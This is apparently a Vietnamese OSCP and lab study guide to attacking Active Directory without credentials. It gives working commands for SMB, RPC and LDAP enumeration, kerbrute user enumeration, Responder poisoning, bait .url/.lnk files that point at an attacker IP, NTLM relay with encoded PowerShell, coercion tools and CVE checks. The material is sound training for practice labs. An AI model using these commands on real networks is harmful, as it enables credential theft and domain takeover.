# 01 — Không có credential (No creds)

Mục tiêu giai đoạn này: **tìm ra ít nhất một username, hoặc tốt hơn là một cặp
username/password (hay hash)**. Trong OSCP+ phần AD thường cho sẵn credential
(assumed breach), nhưng các máy standalone và nhiều lab (HTB/PG) vẫn bắt đầu từ
đây, và sau khi pivot vào mạng nội bộ bạn lại phải làm lại các bước này.

---

## 1. Quét mạng & xác định DC

```bash
# Tìm host sống trong subnet
nxc smb 10.10.10.0/24                         # liệt kê máy Windows: tên, domain, OS, SMB signing
nmap -sn 10.10.10.0/24

# Quét đầy đủ DC
sudo nmap -p- --min-rate 5000 -Pn $DC -oA nmap/allports
sudo nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV -Pn $DC -oA nmap/dc
```

**Cách đọc kết quả:**
- Port 88 (Kerberos) + 389 (LDAP) + 53 (DNS) → đây là **Domain Controller**.
- Script `ldap-rootdse` / `smb-os-discovery` của nmap cho biết **tên domain** và **hostname**.
- `nxc smb` cho biết `signing:False` → máy đó **có thể bị NTLM relay** (xem mục 7).

---

## 2. SMB: Null session & Guest

**Giải thích:** *Null session* = kết nối SMB với user rỗng, password rỗng. *Guest*
= tài khoản `guest` (thường bị disable, nhưng lab hay bật). Nếu được phép, có thể
liệt kê share, user, nhóm, chính sách mật khẩu.

```bash
# Null session
nxc smb $DC -u '' -p ''
nxc smb $DC -u '' -p '' --shares
nxc smb $DC -u '' -p '' --users
nxc smb $DC -u '' -p '' --pass-pol           # chính sách khóa tài khoản — RẤT quan trọng trước khi spray

# Guest (password rỗng hoặc bất kỳ)
nxc smb $DC -u 'guest' -p '' --shares
nxc smb $DC -u 'guest' -p '' --rid-brute 10000   # brute RID → ra danh sách user/group ngay cả khi --users bị chặn

smbclient -L //$DC -N
smbmap -H $DC -u null -p ''
smbclient //$DC/ShareName -N
  smb: \> recurse ON
  smb: \> prompt OFF
  smb: \> mget *                                   # tải toàn bộ share

# Tải toàn bộ share bằng NetExec (spider_plus)
nxc smb $DC -u guest -p '' -M spider_plus -o DOWNLOAD_FLAG=True
# → file JSON + dữ liệu ở /tmp/nxc_hosted/nxc_spider_plus/ (hoặc ~/.nxc/modules/...)
```

**rpcclient** (RPC qua SMB):

```bash
rpcclient -U "" -N $DC
rpcclient $> enumdomusers          # danh sách user + RID
rpcclient $> querydispinfo         # user + DESCRIPTION  ← hay chứa mật khẩu!
rpcclient $> enumdomgroups
rpcclient $> querygroupmem 0x200   # thành viên Domain Admins (RID 512 = 0x200)
rpcclient $> queryuser 0x1f4       # chi tiết Administrator (RID 500)
rpcclient $> getdompwinfo          # chính sách mật khẩu

enum4linux-ng -A $DC -oA enum4linux     # tự động hóa tất cả ở trên
```

**Tìm gì trong share:** file `.xml` (Groups.xml – GPP), script `.ps1/.bat/.vbs`
(mật khẩu hard-code), `.config`, `.kdbx` (KeePass), `.zip/.pfx` (crack được), file
Office/PDF (metadata chứa username → tạo wordlist), file "Notice/Welcome" chứa
**mật khẩu mặc định cho nhân viên mới**.

```bash
# Grep nhanh trong thư mục đã tải
grep -riE 'pass|pwd|cred|secret|cpassword' ./loot/ 2>/dev/null
exiftool -Creator -Author -LastModifiedBy ./loot/*.pdf ./loot/*.docx   # lấy username từ metadata
```

**Lab:** HTB *Active* (share `Replication` anonymous), HTB *Cicada* (guest → HR
notice có mật khẩu mặc định), HTB *Resolute* & PG *Resourced* (`querydispinfo` có
password trong description), HTB *Sauna*.

---

## 3. LDAP anonymous bind

**Giải thích:** Một số DC cho phép bind LDAP không cần xác thực → đọc toàn bộ cây
thư mục: user, nhóm, thuộc tính `description`, `info`, thậm chí thuộc tính tùy
biến chứa mật khẩu (HTB *Cascade* có `cascadeLegacyPwd`).

```bash
# 1) Lấy naming context (luôn được phép)
ldapsearch -x -H ldap://$DC -s base namingcontexts
# → DC=corp,DC=local

# 2) Thử dump toàn bộ
ldapsearch -x -H ldap://$DC -b "DC=corp,DC=local" > ldap_anon.txt
ldapsearch -x -H ldap://$DC -b "DC=corp,DC=local" "(objectClass=person)" sAMAccountName description info memberOf

# 3) Lọc nhanh
grep -iE 'sAMAccountName|description|info|pwd|pass' ldap_anon.txt

# NetExec
nxc ldap $DC -u '' -p '' --users
windapsearch -d $DOMAIN --dc $DC -m users       # tool python thay thế
```

**Lab:** HTB *Forest* (anon LDAP/RPC liệt kê user), HTB *Cascade*, PG *Hutch*,
Vulnlab/HTB *Baby* (description chứa mật khẩu khởi tạo).

---

## 4. Liệt kê username qua Kerberos (không cần credential)

**Giải thích:** Khi gửi AS-REQ cho một username, KDC trả lời khác nhau:
`KDC_ERR_PRINCIPAL_UNKNOWN` (user không tồn tại) vs `KDC_ERR_PREAUTH_REQUIRED`
(user tồn tại). Không sinh event 4625 (logon fail) nên khó bị phát hiện, **không
gây khóa tài khoản**.

```bash
kerbrute userenum -d $DOMAIN --dc $DC /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt
kerbrute userenum -d $DOMAIN --dc $DC /usr/share/seclists/Usernames/Names/names.txt

# Làm sạch output
grep -oP '[^\s]+@' valid_users.txt | tr -d '@' | sort -u > users.txt

# nmap
nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm="$DOMAIN",userdb=users.txt $DC
```

Nếu kerbrute tìm ra user **không yêu cầu pre-auth** nó sẽ in luôn AS-REP hash →
sang [02-co-username.md](02-co-username.md#2-as-rep-roasting).

**Lab:** THM *Attacktive Directory* (kerbrute với wordlist cho sẵn), HTB *Sauna*,
HTB *Blackfield*.

---

## 5. Lấy username từ nguồn khác

- **Website công ty**: trang "About us/Team" → tạo biến thể tên (mục 1 file 02).
- **Email** trong web, **metadata** file PDF/DOCX, **SMTP** (`smtp-user-enum -M VRFY/RCPT`).
- **SNMP** (`snmpwalk -v2c -c public $TARGET 1.3.6.1.4.1.77.1.2.25` → danh sách user Windows).
- **Web app** có trang đăng nhập trả lỗi khác nhau theo user.

---

## 6. LLMNR / NBT-NS / mDNS Poisoning (Responder)

**Giải thích:** Khi Windows không phân giải được tên qua DNS (gõ sai tên share
`\\fileserv`), nó **broadcast** hỏi LLMNR/NBT-NS trong mạng LAN. Responder trả lời
"tôi là máy đó" → nạn nhân gửi xác thực NTLM tới bạn → bạn bắt được **NetNTLMv2
hash** → crack offline (không pass-the-hash được NetNTLMv2!).

```bash
sudo responder -I tun0 -v              # -I interface; lab VPN thường là tun0
# Chỉ phân tích, không đầu độc:
sudo responder -I tun0 -A
# Hash lưu tại /usr/share/responder/logs/  (SMB-NTLMv2-SSP-<ip>.txt)

hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Trong lab/OSCP thường gặp các biến thể "ép nạn nhân xác thực tới bạn":**

| Cách | Lệnh/Ý tưởng |
|------|--------------|
| Web app cho nhập đường dẫn file/URL (SSRF, include, upload) | Nhập `\\$LHOST\share\x` hoặc `file://$LHOST/x` |
| MSSQL | `EXEC xp_dirtree '\\$LHOST\share';` (xem file 03) |
| Share **ghi được** mà user khác hay mở | Đặt file `.lnk`, `.url`, `.scf`, `.library-ms`, `desktop.ini` trỏ về `\\$LHOST` |
| File Office/PDF được "bot" mở | Chèn UNC path (ntlm_theft tạo sẵn) |

```bash
# ntlm_theft tạo đủ loại file bẫy
python3 ntlm_theft.py -g all -s $LHOST -f bait
# Upload lên share ghi được:
smbclient //$TARGET/Public -U 'guest%' -c 'put bait/bait.url'
# hoặc dùng module NetExec
nxc smb $TARGET -u u -p p -M slinky -o SERVER=$LHOST NAME=important     # tạo .lnk
nxc smb $TARGET -u u -p p -M slinky -o CLEANUP=True NAME=important
```

File `.url` tối thiểu:

```ini
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\192.168.45.200\%USERNAME%.icon
IconIndex=1
```

**Lab:** HTB *Responder* (Starting Point – LFI → UNC), PG *Vault* (share ghi
được → `.url`/`.lnk`), PG *Heist* (SSRF → Responder), HTB *Escape* & *Querier*
(MSSQL `xp_dirtree`), HTB *Intelligence* (thêm DNS record → Responder), THM
*Breaching Active Directory*.

---

## 7. NTLM Relay

**Giải thích:** Thay vì crack hash, **chuyển tiếp** phiên xác thực NTLM của nạn
nhân tới máy thứ ba để đăng nhập với danh tính nạn nhân. Điều kiện:
- Máy đích **không bật SMB signing** (với relay SMB) — máy trạm Windows mặc định
  *không bắt buộc* signing, DC thì *bắt buộc*.
- Nạn nhân là **local admin** trên máy đích thì mới dump SAM/chạy lệnh được.
- Không relay ngược về chính máy nạn nhân (SMB→SMB cùng máy bị chặn).

```bash
# 1) Liệt kê máy không bắt buộc signing
nxc smb 10.10.10.0/24 --gen-relay-list targets.txt

# 2) Tắt SMB/HTTP server của Responder (để ntlmrelayx dùng cổng 445/80)
sudo sed -i 's/^SMB = On/SMB = Off/; s/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf

# 3) Chạy relay
sudo impacket-ntlmrelayx -tf targets.txt -smb2support                  # mặc định: dump SAM nếu là admin
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i               # mở shell SMB tương tác (nc 127.0.0.1 11000)
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell -enc <b64>"   # chạy lệnh
sudo impacket-ntlmrelayx -t ldaps://$DC --delegate-access              # relay sang LDAP → tạo máy + RBCD
sudo impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp --adcs --template DomainController  # ESC8

# 4) Kích hoạt
sudo responder -I tun0
```

Trong OSCP, relay xuất hiện chủ yếu dạng: **bắt được xác thực từ một service →
relay sang máy khác có cùng user là admin**. Thử thêm trường hợp "hash crack
không được" → nghĩ tới relay.

**Lab:** THM *Breaching Active Directory*, HTB Academy *NTLM Relay Attacks*, GOAD
(SMB relay giữa các máy trong `north.sevenkingdoms.local`).

---

## 8. Coerce authentication (ép máy xác thực)

**Giải thích:** Một số RPC (MS-RPRN *PrinterBug*, MS-EFSR *PetitPotam*, MS-DFSNM
*DFSCoerce*) cho phép yêu cầu một máy (kể cả DC) **kết nối tới đường dẫn UNC bạn
chọn** → máy đó gửi xác thực NTLM/Kerberos của **tài khoản máy** (`DC01$`). Kết
hợp với relay (ESC8, LDAP RBCD) hoặc unconstrained delegation để chiếm domain.
PetitPotam *không xác thực* chỉ chạy trên DC chưa vá; hầu hết cần credential.

```bash
nxc smb $DC -u $USER -p $PASS -M coerce_plus             # kiểm tra máy có thể coerce
nxc smb $DC -u $USER -p $PASS -M coerce_plus -o LISTENER=$LHOST
python3 PetitPotam.py -u $USER -p $PASS -d $DOMAIN $LHOST $DC
python3 printerbug.py $DOMAIN/$USER:$PASS@$DC $LHOST
coercer coerce -u $USER -p $PASS -d $DOMAIN -l $LHOST -t $DC
```

---

## 9. Lỗ hổng "không cần credential" nổi tiếng (mindmap: *Known vulnerabilities*)

| CVE | Tên | Ghi chú cho OSCP |
|-----|-----|------------------|
| CVE-2020-1472 | **ZeroLogon** | Reset mật khẩu máy DC → phá hỏng domain; **tránh dùng trong thi** trừ khi chắc chắn được phép. `nxc smb $DC -M zerologon` để kiểm tra |
| MS17-010 | EternalBlue | Máy cũ (Win7/2008). Có thể gặp ở máy standalone; dùng script AutoBlue thủ công |
| CVE-2021-1675/34527 | PrintNightmare | Cần credential; thêm user admin local hoặc load DLL |
| CVE-2021-42278/42287 | **noPac / sAMAccountName spoofing** | Từ user thường → DA nếu DC chưa vá: `nxc smb $DC -u u -p p -M nopac` |
| CVE-2022-26923 | Certifried | ADCS; xem file 05 |

> Kỳ thi OSCP hướng tới misconfiguration hơn là CVE. Nếu một CVE "phá hủy" như
> ZeroLogon dường như là con đường duy nhất, hãy quay lại enum — bạn gần như
> chắc chắn đã bỏ sót gì đó.

---

## Checklist giai đoạn "No creds"

- [ ] `nxc smb <subnet>` – tên máy, domain, signing
- [ ] nmap DC, thêm `/etc/hosts`
- [ ] Null / guest: shares, users, rid-brute, pass-pol
- [ ] rpcclient `querydispinfo` (description!)
- [ ] LDAP anonymous
- [ ] kerbrute userenum
- [ ] Web / FTP / SMTP / SNMP → username, mật khẩu
- [ ] Responder (nếu ở cùng mạng / có điểm ép xác thực)
- [ ] AS-REP roast với danh sách user vừa có → file 02
